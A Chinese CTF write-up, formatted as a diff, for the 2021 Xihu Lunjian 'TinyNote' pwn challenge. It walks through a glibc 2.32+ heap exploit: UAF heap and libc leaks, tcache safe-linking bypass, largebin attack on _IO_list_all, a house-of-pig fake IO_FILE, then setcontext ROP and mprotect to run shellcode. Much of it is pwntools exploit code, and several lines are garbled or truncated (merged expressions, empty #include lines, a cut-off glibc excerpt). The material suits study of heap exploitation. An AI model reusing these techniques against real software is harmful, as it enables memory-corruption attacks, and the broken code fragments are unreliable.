@@ -1,0 +1,180 @@
+# 西湖论剑2021-TinyNote 题解
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+## 前言
+在刚结束的西湖论剑线上赛中，有一道挺有意思的 Pwn 题——TinyNote，考察了许多关于高版本的 libc 堆知识，比赛的时候已经可以执行
+shellcode，可惜最后没来得及找到 flag 文件2333333，这里给各位师傅分享一下我的解题思路。
+## 一、题目分析
+首先，我们来分析一下题目。
+题目使用了沙箱，禁用了 `execve`：
+IDA 静态分析，很容易就发现题目的 `delete` 函数存在 UAF 漏洞：
+不过，题目除了使用沙箱以外，在 malloc 的时候还增加了一道防护措施：
+也就是说，我们不能 malloc 到堆的第一页以外位置的 chunk ，否则就会检测不通过，直接 `exit`。
+## 二、思路分析
+首先，题目使用的是 malloc，而且申请的大小固定为 0x10，这就没有使用 `tcache stashing unlink
+attack`的可能了。另外，题目限制了申请的 chunk 必须在堆内存的第一页，这样 `tcache`
+相关的攻击手段也就失效了。但是，题目还开启了沙箱，也就意味着我们需要使用 `orw` 或 `mprotect` ，那就必须要执行
+`setcontext`，而要执行 `setcontext` 就必须想办法劫持 `__free_hook`。这似乎与 **只能 malloc
+在堆内存的第一页的 chunk** 相矛盾，除非我们能够从其他地方执行 malloc 并分配到 `__free_hook`，联想到 `add`函数检测失败的
+`exit`，我们很快就会想到 [house of pig](https://www.anquanke.com/post/id/242640) 。
+这里，先简述一下我的思路（这里显示不出标号，以句号结尾作为分段的标志）：
+  1. 使用 UAF 泄露出 heap 基址。
+  2. 使用 UAF 修改 tcache bin 的数量，然后得到一个 0x240 `unsorted chunk`(先不释放)。
+  3. 通过风水堆分布，得到一个 0x450 和 0x440 的 `unsorted chunk`。
+  4. 释放 `unsorted chunk`，泄露 `libc` 基址，并将那俩 `unsorted chunk` 转换成 `large chunk`，实现 [largebin attack](https://www.anquanke.com/post/id/189848)，改写 `_IO_list_all`。
+  5. 通过多次 UAF 来进行 `tcache chunk` 的任意写，将放入 `_IO_list_all` 的 `large chunk` 变成一个 `IO_FILE`。
+  6. 见缝插针地利用已有的 `tcache chunk`，插入相关 `gadget` 所需参数，为后续 `setcontext` 劫持 `rsp` 所需的参数做好准备。
+  7. 再次通过多次 UAF 将 ROP 链布置好，执行 read 写到 `glibc` 的 `bss` 段上并劫持 `rsp` 到 `bss` 段上。
+  8. 通过 UAF 将 `__free_hook` 放到合适的 `tcache bin` 中，为后续的 `house of pig` 做准备。
+  9. 触发 `exit` 退出主函数，进而执行到 `_IO_str_overflow`，劫持 `__free_hook` 并执行 ROP，最终成功将 `rsp` 劫持到 `bss` 段上。
+  10. 最后，ROP 执行 `mprotect` 将 `heap` 变成 RWX 并写入 shellcode，然后劫持程序执行流即可，然后获取 flag 文件名并读取 flag 即可。。
+## 三、解题过程
+####  1、泄露 heap 基址
+在 libc 2.32 版本之后，对 tcache
+增加了一个异或保护机制，具体原理可以看这篇[文章](https://www.anquanke.com/post/id/236186)。简单来说，`tcache->fd`
+的值现在是 `(&tcache->fd >> 12) ^ target`，这个 `target` 就是指向上一个 `chunk`（按照 tcache
+后进先出的顺序来看的话）。
+这种机制，虽然增加了传统的堆漏洞利用难度，但却使得 heap 泄露更加简单了，只需要一个 `chunk` 即可。
+    add(0)
+    delete(0)
+    show(0)
+    heap_addr = u64(rr(5).ljust(0x8, b'\x00')) > 12) ^(heap_addr+0x50) # 指向 unsorted chunk 首部
+        edit(1, p64(poc))
+        add(0)
+        add(1)
+        edit(1, p8(8)*8 + p64(0x241)) # 任意写修改数量并构造首部
+        delete(0) # 回收 chunk，节省利用已有的 chunk
+        add(0)
+        add(1)
+        delete(0)
+        delete(1)
+        poc = ((heap_addr+0x2e0)>>12) ^ (heap_addr+0x60) # 指向 unsorted chunk 首部
+        edit(1, p64(poc))
+        add(1)
+        add(0) # unsorted_chunk: heap+0x10 ---> 得到 unsorted chunk
+        log.success('unsorted_chunk: 0x%x', heap_addr+0x60) 
+        delete(1) # 回收 chunk，节省利用已有的 chunk
+这里，为了节省 chunk，就将其和泄露 heap 基址的步骤合到了一起。
+####  3、风水堆分布，获得两个 large chunk
+这里，我们需要风水堆分布，分别构造出 `0x450` 和 `0x440` 的 large chunk，内存分布为：
+  1. 第一个 large chunk：`0x20 --> 0x450 --> 0x20 --> top chunk`
+  2. 第二个 large chunk：`0x20 --> 0x440 --> 0x30 --> top chunk`
+        add(1)
+        edit(1, mchunk_size(0x21))
+        add(1)
+        edit(1, mchunk_size(0x451))
+        for i in range(0x22):
+            add(1)
+        add(1)
+        add(2)
+        delete(1)
+        delete(2)
+        poc = ((heap_addr+0x780)>>12) ^ (heap_addr+0x310)
+        edit(2, p64(poc))
+        add(2)
+        add(1) # 得到一个 0x450 的 chunk，首部位于 heap_addr+0x300
+        log.success('large chunk No.1: 0x%x', heap_addr+0x300)
+        delete(2) # 回收刚刚利用的 chunk
+        add(2)
+        edit(2, mchunk_size(0x21))
+        add(2)
+        edit(2, mchunk_size(0x441))
+        add(2)
+        add(2)
+        for i in range(0x1f):
+            add(2)
+        add(2)
+        edit(2, mchunk_size(0x31))
+        add(2)
+        delete(0)
+        show(0)
+        libc.address = u64(rr(8)) - 0x1e0c00
+        log.success('libc_addr: 0x%x', libc.address)
+        add(0)
+        delete(0)
+        delete(2)
+        poc = ((heap_addr+0xc00)>>12)^((heap_addr+0x7b0))
+        edit(2, p64(poc))
+        add(0)
+        add(2) # 得到一个 0x440 的 chunk，首部位于 heap_addr+0x7a0
+        log.success('large chunk No.2: 0x%x', heap_addr+0x7a0)
+        delete(0) # 回收刚刚利用的 chunk
+由于我们实现任意写，需要连续申请两个 `tcache chunk`，所以在构造第二个 `large chunk` 的时候，我们需要将 `unsorted
+chunk` 释放掉，将存储的位置空闲出来，那么这个过程便可顺势将 `libc` 基址获取到。
+####  4、largebin attack
+接下来，我们就需要实施 `largebin attack` 了。这里，可能有师傅会问：我们每次只能申请到 0x10 的 chunk，怎么让这两个
+`large chunk` 进入到 `large bin` 呢？这里，主要利用到一个比较少见的方法。
+很多师父学习 `largebin attack`
+应该都是参考这篇[文章](https://www.anquanke.com/post/id/189848)，示例代码如下：
+    #include
+    #include
+    #include
+    int main(){
+        void *p1, *p2, *p3;
+        p1 = malloc(0x438);
+        malloc(0x18);
+        free(p1); // p1 ---> 0x438 unsorted chunk
+        p2 = malloc(0x448); // p1 ---> 0x438 large chunk 
+    }
+只要我们申请的 chunk 的 `size` 比 `unsorted chunk` 的 `size` 大，那么原本的 `unsorted chunk`
+就会被放入 `small chunk` 或 `large chunk`。
+但其实还有种情况：当存在两个 `unsorted chunk` 时（`p2---> p1 ---> main_arena`），当我们申请 `chunk`
+时，`ptmalloc` 就会先将 `p2` 放入 `large chunk`，然后再切割 `p1` 去分配 `chunk`，示例代码：
+    #include
+    #include
+    #include
+    int main(){
+        void *p1, *p2, *p3;
+        p1 = malloc(0x438);
+        malloc(0x18);
+        p2 = malloc(0x448); 
+        maloc(0x18);
+        free(p1); // p1 ---> 0x438 unsorted chunk
+        free(p2); // p2 ---> 0x448 unsorted chunk
+        malloc(0x18); // p2 ---> 0x448 large chunk
+    }
+只要了这点之后，我们就可以将刚刚的两个 `large chunk` 放入 `large bin`，从而实现 `largebin attack` 了。
+        delete(1) # 释放掉第一个 large chunk
+        add(0)
+        add(1) # 第一个 large chunk 放入 large bin
+        delete(0)
+        delete(1)
+        poc = ((heap_addr+0x80)>>12)^((heap_addr+0x320)) # 指向第一个 large chunk 的 fd_nextsize 和 bk_nextsize
+        edit(1, p64(poc))
+        add(0)
+        add(1)
+        target = _IO_list_all - 0x20
+        edit(1, p64(heap_addr+0x300)+p64(target)) # 修改 b_nextsize 指向 _IO_list_all - 0x20
+        delete(0)
+        delete(2) # 释放掉第二个 large chunk
+        add(0)
+        add(0) # 攻击成功，成功将第二个 large chunk 写入 _IO_list_all
+我们不妨来看看，第一个 large chunk 的入链过程：
+####  5、构造 FAKE IO_FILE
+这里参考 [house of pig](https://www.anquanke.com/post/id/242640) 最后的 Poc：
+    fake_IO_FILE = 2*p64(0)
+    fake_IO_FILE += p64(1)                    #change _IO_write_base = 1
+    fake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff
+    fake_IO_FILE += p64(0)
+    fake_IO_FILE += p64(heap_base+0x148a0)                # _IO_buf_base
+    fake_IO_FILE += p64(heap_base+0x148b8)                # _IO_buf_end
+    fake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\x00')
+    fake_IO_FILE += p64(0)                    #change _mode = 0
+    fake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\x00')
+    fake_IO_FILE += p64(IO_str_vtable)        #change vtable
+利用多次的 UAF 对第二个 large chunk 进行修改，最终构造结果如下：
+这里，我们需要关注的是红色框标注的两个值，它们分别代表 `_IO_buf_base` 和 `_IO_buf_end`，具体作用我们看下
+`_IO_str_overflow` 的源码：
+    int
+    _IO_str_overflow (FILE *fp, int c)
+    {
+        ... ...
+          char *new_buf;
+          char *old_buf = fp->_IO_buf_base;
+          size_t old_blen = _IO_blen (fp); // _IO_buf_end - _IO_buf_base
+          size_t new_size = 2 * old_blen + 100;
+          if (new_size _IO_buf_base = NULL;
+            }
+        ... ...
+    }
